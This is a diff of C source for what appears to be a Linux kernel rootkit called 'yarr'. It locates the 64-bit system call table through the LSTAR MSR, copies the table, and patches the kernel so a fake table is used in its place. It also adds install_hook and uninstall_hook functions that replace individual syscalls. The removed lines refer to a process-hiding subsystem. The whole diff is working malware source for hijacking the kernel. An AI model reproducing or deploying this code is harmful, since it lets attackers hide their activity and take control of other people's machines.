@@ -14,17 +14,18 @@
 
 // Our fake sys_call_table.
 static unsigned long __fake_sct[__NR_syscall_max+1];
+static unsigned long *__sys_call_table;
 
 /**
- * Internal. Does all the work needed to locate the 64-bit sys_call_table and
- * hook it with our fake sys_call_table.
+ * Does all the work needed to locate the 64-bit sys_call_table and hook it
+ * with our fake sys_call_table.
  *
  * @return: Zero on success, non-zero elsewhere.
  */
-int __hook_syscall_table_64(void) {
+static int __hook_syscall_table_64(void) {
     unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
     int displacement, sct_addr_encoded, i, err;
-    unsigned long addr, *sys_call_table;
+    unsigned long addr;
     int32_t fake_sct_addr;
 
     // Get the address of the LSTAR MSR, it contains the entry point of
@@ -76,32 +77,17 @@ int __hook_syscall_table_64(void) {
     // Now we know the address of sys_call_table, back it up for when we
     // unload. We promote first to long so there's sign extension and then to 
     // pointer so we omit a warning.
-    sys_call_table = (void *)(long)sct_addr_encoded;
+    __sys_call_table = (void *)(long)sct_addr_encoded;
 
     // Fulfill our fake sys_call_table with the real syscalls.
     for (i = 0; i < __NR_syscall_max + 1; i++) {
-        __fake_sct[i] = sys_call_table[i];
+        __fake_sct[i] = __sys_call_table[i];
     }
-
-    // Install our entry point.
-    __fake_sct[YARR_VECTOR] = (unsigned long)entry_yarrcall;
-
-    // Initialize the syscall hooking subsystem.
-    err = init_hook_syscalls(__fake_sct, sys_call_table);
-    if (err) {
-        yarr_log("error initializing hook syscall subsystem");
-        return -1;
-    }
-
-    // Install syscall hooks for hidepid subsystem.
-    hidepid_install_syscalls();
 
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
     fake_sct_addr = get_low_4_bytes((unsigned long)&__fake_sct);
-    err = patch((unsigned char *)(addr_8b + 3),
-            (unsigned char *)&(fake_sct_addr),
-            4);
+    err = patch(addr_8b + 3, &(fake_sct_addr), 4);
     if (err) {
         yarr_log("error patching the sys_call_table");
         return -1;
@@ -110,12 +96,7 @@ int __hook_syscall_table_64(void) {
     return 0;
 }
 
-/**
- * Hooks both 32 and 64-bit system call tables.
- *
- * @return: Zero on success, non-zero elsewhere.
- */
-int hook_syscall_tables(void) {
+int hook_init(void) {
     int err;
 
     // Hook the 64-bit system call table.
@@ -126,6 +107,47 @@ int hook_syscall_tables(void) {
 
     // TODO: Hook the 32-bit system call table.
 
+    return err;
+}
+
+int hook_finish(void) {
     return 0;
+}
+
+int install_hook(int n, void *fnc_addr) {
+    if (__fake_sct == NULL) {
+        yarr_log("Call to syscall hook subsystem before initializing");
+        return -1;
+    }
+
+    if (n < 0 || n >= __NR_syscall_max + 1) {
+        yarr_log("Index %d out of syscall table bounds", n);
+        return -1;
+    }
+
+    if (fnc_addr == NULL) {
+        yarr_log("Hook function is NULL");
+        return -1;
+    }
+
+    return patch(&__fake_sct[n], &fnc_addr, sizeof(void *));
+}
+
+int uninstall_hook(int n) {
+    if (__fake_sct == NULL) {
+        yarr_log("Call to syscall hook subsystem before initializing");
+        return -1;
+    }
+
+    if (n < 0 || n >= __NR_syscall_max + 1) {
+        yarr_log("Index %d out of syscall table bounds", n);
+        return -1;
+    }
+
+    return unpatch(&(__fake_sct[n]));
+}
+
+void * get_original_syscall_table64(void) {
+    return __sys_call_table;
 }
 
